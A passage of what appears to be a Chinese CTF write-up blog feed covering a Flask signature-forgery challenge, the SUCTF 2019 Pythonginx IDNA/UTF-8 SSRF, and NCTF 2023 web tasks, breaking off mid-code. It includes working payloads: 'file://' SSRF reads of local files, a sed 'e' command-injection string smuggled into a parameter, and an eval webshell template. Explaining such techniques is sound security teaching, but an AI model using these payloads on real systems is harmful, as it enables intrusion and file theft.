class="comment">#获取请求端的ip地址</span></span><br><span class="line">    <span class="keyword">if</span>(waf(param)):     <span class="comment">#92       #调用waf函数进行过滤</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)             <span class="comment">#创建Task类对象</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())            <span class="comment">#以json的形式返回到客户端</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scan</span>(<span class="params">param</span>): <span class="comment">#33</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]        <span class="comment">#</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):               </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="comment"># xxx flag.txt scan</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):            <span class="comment">#将传入的字符串进行md5加密</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):        <span class="comment">#70                #waf过滤掉了使用gopher和file直接ssrf的方法</span></span><br><span class="line">    check=param.strip().lower() <span class="comment">#删除首尾空格并转换为小写</span></span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">9999</span>) </span><br></pre></td></tr></table></figure><p><strong>两个关键api:</strong></p><ol><li><strong>&#x2F;geneSign:</strong></li></ol><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):               </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>传入param&#x3D;xxxx</p><p>返回值表达式:md5(secert_key + ‘xxxx’ + ‘scan’)</p><ol start="2"><li><strong>&#x2F;De1ta:</strong></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)     </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))        <span class="comment">#cookie传递action参数，对应不同的处理方式</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))        <span class="comment">#传递get方式的参数param</span></span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))            <span class="comment">#cookie传递sign参数sign</span></span><br><span class="line">    ip = request.remote_addr                <span class="comment">#获取请求端的ip地址</span></span><br><span class="line">    <span class="keyword">if</span>(waf(param)):     <span class="comment">#92       #调用waf函数进行过滤</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)             <span class="comment">#创建Task类对象</span></span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())            <span class="comment">#以json的形式返回到客户端</span></span><br></pre></td></tr></table></figure><p>task.Exec()中实现了对result.txt的读写</p><p>第一反应实际上应该是直接ssrf,但加了waf</p><p><strong>题目提示flag在flag.txt中,故我们可以先把flag.txt写入result.txt,再读取result.txt</strong></p><p>如此,也就不用绕waf了</p><p>但有一个不可避免的问题是 想要执行Exec就必须通过Exec一开始的checkSign验证</p><h2 id="如何通过验证呢"><a href="#如何通过验证呢" class="headerlink" title="如何通过验证呢?"></a>如何通过验证呢?</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">checkSign</span>(<span class="params">self</span>): <span class="comment">#30</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign): <span class="comment">#86</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getSign</span>(<span class="params">action, param</span>):               </span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure><p>我们需要传入三个参数: param  action  sign</p><p>毫无疑问param是我们要读取的文件,而action可选为scan或read, sign则是对secert_key + param + action的散列</p><p>secert_key 是随机的,这个散列值需要从<code>/geneSign?param=</code>中获取,但是从这获取的sign中action为scan</p><p>也就是上面提到的<code>md5(secert_key + &#39;xxxx&#39; + &#39;scan&#39;)</code></p><p><strong>有意思的是,在action的判断中采用了<code>in</code>,并且没有if else结构,故可以使<code>action=readscan</code>来同时触发写和读</strong></p><p>那么需要的散列值就是<code>md5(secert_key + &#39;xxxx&#39; + &#39;readscan&#39;)</code></p><p>可以发现这与<code>md5(secert_key + &#39;xxxxread&#39; + &#39;scan&#39;)</code>等价,这是可以从&#x2F;geneSign获取的一个md5</p><p>因此 可以构造<code>/geneSign?param=flag.txtread</code>来获取这个sign</p><p><strong>这个sign允许我们传入param&#x3D;flag.txt,action&#x3D;readscan</strong></p><p>如此一来,就可以通过验证并把flag写入到result.txt并读取出来</p><p>poc:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240108195710657.png" alt="image-20240108195710657"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240108195726830.png" alt="image-20240108195726830"></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idna与utf-8编码漏洞 [SUCTF 2019]Pythonginx</title>
      <link href="/2024/01/08/idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E-SUCTF-2019-Pythonginx/"/>
      <url>/2024/01/08/idna%E4%B8%8Eutf-8%E7%BC%96%E7%A0%81%E6%BC%8F%E6%B4%9E-SUCTF-2019-Pythonginx/</url>
      
        <content type="html"><![CDATA[<p>参考:</p><p>[Hanamizuki花水木]: <a href="https://www.cnblogs.com/cimuhuashuimu/p/11490431.html">https://www.cnblogs.com/cimuhuashuimu/p/11490431.html</a>“ idna与utf-8编码漏洞”<br>[lz1y]: <a href="https://xz.aliyun.com/t/2737">https://xz.aliyun.com/t/2737</a>“Punycode安全威胁浅析”<br>[black hat 2019]: <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a>“us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf”</p><p>通过这几篇文章便可以基本了解idna与utf-8编码漏洞问题</p><p>涉及题目:</p><h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p>把得到的提示代码复制下来并整理缩进</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>(): </span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>) </span><br><span class="line">    host = parse.urlparse(url).hostname </span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span> </span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url)) </span><br><span class="line">    host = parts[<span class="number">1</span>] </span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host </span><br><span class="line">    newhost = [] </span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>): </span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) </span><br><span class="line">        parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost) </span><br><span class="line">    <span class="comment">#去掉 url 中的空格 </span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>] </span><br><span class="line">    host = parse.urlparse(finalUrl).hostname </span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: </span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read() </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br></pre></td></tr></table></figure><p>可以发现我们是需要执行到第19行的<code>.read()</code>,也就是需要传入pyaload仅仅使得第三个if条件成立</p><p>第三次是将主机名以<code>.</code>拆分,将每一部分idna编码后又utf-8解码,然后重新拼接为主机名,再还原为url,再取hostname</p><p>这里便使用<code>℆</code>这个字符来绕过前两次if,而在第三次时<code>℆</code>会被解码为<code>c/u</code></p><p>之后便是ssrf读取本地文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: file://suctf.c℆sr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure><p>得到flag地址为&#x2F;usr&#x2F;fffffflag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.c℆sr/fffffflag</span><br></pre></td></tr></table></figure><p>参考题解:</p><p>[rabbittt]: <a href="https://www.cnblogs.com/rabbittt/p/13297683.html">https://www.cnblogs.com/rabbittt/p/13297683.html</a>“ [SUCTF 2019]Pythonginx”</p><p><strong>3.Ngnix重要文件位置</strong></p><blockquote><p>▷配置文件存放目录：&#x2F;etc&#x2F;nginx</p><p>▶主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf 或 &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p><p>▷管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service</p><p>▶模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules</p><p>▷应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx</p><p>▶程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</p><p>▷日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx</p></blockquote><p>[出题人笔记]: <a href="https://xz.aliyun.com/t/6057?time__1311=n4+xnD0DRDgGG=G8+DCDlhje0=YTviggx7K4ex&amp;alichlgref=https://www.cnblogs.com/">https://xz.aliyun.com/t/6057?time__1311=n4%2BxnD0DRDgGG%3DG8%2BDCDlhje0%3DYTviggx7K4ex&amp;alichlgref=https%3A%2F%2Fwww.cnblogs.com%2F</a>“ 出题人笔记”</p><p>这让我不禁想起了一道题目是关于利用php大写字母转换为小写字母函数而bypass对admin的过滤,挖个坑先,下次记录</p>]]></content>
      
      
      <categories>
          
          <category> 字符编码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> idna与utf-8编码漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF 2023 Web 复现</title>
      <link href="/2024/01/06/NCTF-2023-Web-%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/01/06/NCTF-2023-Web-%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="NCTF-2023-web-题目复现"><a href="#NCTF-2023-web-题目复现" class="headerlink" title="NCTF 2023 web 题目复现"></a>NCTF 2023 web 题目复现</h1><p>复现+尝试对wp进一步解释</p><h2 id="webshell-generator"><a href="#webshell-generator" class="headerlink" title="webshell_generator"></a>webshell_generator</h2><p>获取生成的webshell时存在任意文件读取</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/download.php?file=/tmp/0cjbe2b32se0qva8&amp;filename=webshell.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.26:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.1.26:8080/</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以读取到以下文件</p><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">security_validate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\r|\n/&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;<span class="subst">$key</span> 不能包含换行符！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>) &gt; <span class="number">114</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;<span class="subst">$key</span> 不能超过114个字符！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">security_validate</span>();</span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>] &amp;&amp; @<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>] &amp;&amp; @<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;language&#x27;</span>] !== <span class="string">&#x27;PHP&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;PHP是最好的语言&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$method</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>];</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;METHOD=<span class="subst">$method</span>&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;你的method太复杂了！&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;KEY=<span class="subst">$key</span>&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;你的key太复杂了！&quot;</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = -<span class="number">1</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;sh generate.sh&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;生成失败了！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: download.php?file=<span class="subst">$filename</span>&amp;filename=<span class="subst">&#123;$_POST[&#x27;filename&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>generate.sh:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line">NEW_FILENAME=$(<span class="built_in">tr</span> -dc a-z0-9 &lt;/dev/urandom | <span class="built_in">head</span> -c 16)</span><br><span class="line"><span class="built_in">cp</span> template.php <span class="string">&quot;/tmp/<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&quot;s/KEY/<span class="variable">$KEY</span>/g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line">sed -i <span class="string">&quot;s/METHOD/<span class="variable">$METHOD</span>/g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">realpath</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br></pre></td></tr></table></figure><p>template.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_METHOD</span>[<span class="string">&quot;KEY&quot;</span>]);</span><br></pre></td></tr></table></figure><p>这表明我们输入的请求方法和密钥分别充当了$METHOD和$KEY这两个环境变量的值,</p><p>因此可以尝试构造特殊的环境变量值,将sed命令闭合掉,注入getflag的命令</p><p>类似于sql注入,但这里是要将shell命令注入到generate.sh这个脚本中</p><p>官方给出的payload:  <code>/g;1e /readflag;s//</code></p><p>拼接后:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&quot;s/KEY//g;1e /readflag;s///g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br></pre></td></tr></table></figure><p>没用的知识: 事实上测试发现后面的&#x2F;&#x2F;g并不必要闭合,sed命令似乎并不会因部分语法错误而放弃整个输出</p><p>poc:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1703679696943.png" alt="1703679696943"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1703679714478.png" alt="1703679714478"></p><p><strong>注:</strong></p><p>sed命令可以在使用e来执行shell命令</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;e [command]</span><br></pre></td></tr></table></figure><p>此命令允许将 shell 命令的输入 通过管道传输到模式空间。如果没有参数，<code>e</code> 命令 将执行在模式空间中找到的命令， 并用输出替换模式空间；尾随换行符 将被抑制。</p><p>如果指定了参数，<code>e</code> 命令 会将其解释为命令并将其输出发送到输出流。 该命令可以跨多行运行，除最后一行外，其他所有行都以 反斜杠结尾。</p><p>在这两种情况下，如果要执行的命令包含 NUL 字符，则结果不确定。</p><p>请注意，与 <code>r</code> 命令不同，该命令的输出将立即打印；<code>r</code> 命令会将输出延迟到当前周期的末尾。</p></blockquote><p>这里的模式空间(pattern space)是sed命令的处理缓冲区</p><p>sed逐行将文件放入内存中,按照给出的 匹配和操作 逐行处理并输出到标准输出</p><p>一些测试:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1703665212782.png" alt="1703665212782"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1703665290161.png" alt="1703665290161"></p><h2 id="Wait-what"><a href="#Wait-what" class="headerlink" title="Wait what?"></a>Wait what?</h2><p>此题给出了后端的源代码作为附件,可以看见后端为node.js</p><p>之前尝试做过一些js原型链污染的题目,稍微了解过node.js,但是这里与原型链污染并没有什么关系</p><p>这题主要是对两个waf的绕过</p><p>先来看看catflag的路由,这也是我们最关心的地方</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/api/flag&quot;</span>, requireLogin, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">if</span> (username !== <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;登录成功，但是只有&#x27;admin&#x27;用户可以看到flag，你的用户名是&#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> flag = child_process.<span class="title function_">execSync</span>(<span class="string">&quot;cat flag&quot;</span>).<span class="title function_">toString</span>()</span><br><span class="line">    res.<span class="title function_">end</span>(flag)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;有人获取到了flag！为了保证题目的正常运行，将会重置靶机环境！&quot;</span>)</span><br><span class="line">    res.<span class="title function_">on</span>(<span class="string">&quot;finish&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123; process.<span class="title function_">exit</span>(<span class="number">0</span>) &#125;, <span class="number">1</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>这里使用了express框架,比较关注的是<code>requireLogin</code>,这里摘抄gpt对这个参数的解释</p><blockquote><p> <code>requireLogin</code>是一个中间件，用于确保用户已登录。这意味着只有经过身份验证的用户才能执行以下的代码块。</p></blockquote><p>那么这作为一个中间件,所有请求将需要经其处理</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//鉴权中间件</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">requireLogin</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span></span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span></span><br><span class="line">    <span class="keyword">if</span> (!username || !password) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;用户名或密码不能为空&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> username !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> password !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;用户名或密码不合法&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 基于正则技术的封禁用户匹配系统的设计与实现</span></span><br><span class="line">    <span class="keyword">let</span> test1 = banned_users_regex.<span class="title function_">test</span>(username)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`使用正则<span class="subst">$&#123;banned_users_regex&#125;</span>匹配<span 